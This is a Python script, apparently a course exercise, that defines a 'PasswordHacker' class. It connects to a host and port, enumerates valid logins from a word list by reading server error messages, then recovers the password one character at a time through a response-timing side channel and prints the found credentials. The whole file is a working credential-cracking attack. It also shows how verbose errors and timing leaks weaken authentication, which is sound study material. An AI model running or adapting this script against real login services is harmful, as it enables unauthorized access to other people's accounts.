import argparse
import socket
import string
import json
from datetime import datetime, timedelta


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("hostname", type=str)
    parser.add_argument('port', type=int)
    return parser.parse_args()


class PasswordHacker:
    BUFFER_SIZE = 1024

    def __init__(self, args, file_name):
        self._args = args
        self._file_name = file_name
        self._client = socket.socket()

    def __del__(self):
        self._client.close()

    def _send_request(self, user_info):
        login = user_info[0]
        password = user_info[1]
        request = {'login': login, 'password': password}
        self._client.send(json.dumps(request).encode())

    def _get_response(self):
        response = self._client.recv(self.BUFFER_SIZE)
        json_response = json.loads(response.decode())

        return json_response

    def _find_login(self):
        login = ''
        with open(self._file_name) as content:
            logins = content.read().split('\n')
            for possible_login in logins:
                self._send_request((possible_login, ' '))
                response = self._get_response()
                if response['result'] == 'Wrong password!':
                    login = possible_login
                    break

        return login

    def _find_password(self, correct_login):
        password = ''
        charset = (string.ascii_lowercase + string.ascii_uppercase + string.digits)
        while True:
            for char in charset:
                self._send_request((correct_login, password + char))
                start = datetime.now()
                response = self._get_response()
                finish = datetime.now()
                difference = finish - start
                if difference >= timedelta(seconds=0.1):
                    password += char
                    break
                if response['result'] == 'Connection success!':
                    return password + char

    def process(self):
        address = (self._args.hostname, self._args.port)
        self._client.connect(address)
        correct_login = self._find_login()
        correct_password = self._find_password(correct_login)

        print(json.dumps({'login': correct_login, 'password': correct_password}))


def main():
    args = parse_args()
    hacker = PasswordHacker(args, 'logins.txt') # "logins.txt" doesn't work then provide full path 
    hacker.process()


if __name__ == '__main__':
    main()
